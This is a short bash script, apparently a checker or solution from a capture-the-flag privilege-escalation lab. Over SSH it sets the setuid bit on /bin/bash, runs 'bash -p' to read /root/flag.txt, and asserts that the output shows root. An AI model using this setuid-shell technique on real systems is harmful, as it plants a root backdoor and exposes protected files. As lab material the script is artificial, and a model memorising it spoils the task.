#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
/bin/chmod 4755 /bin/bash
/bin/bash -p -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
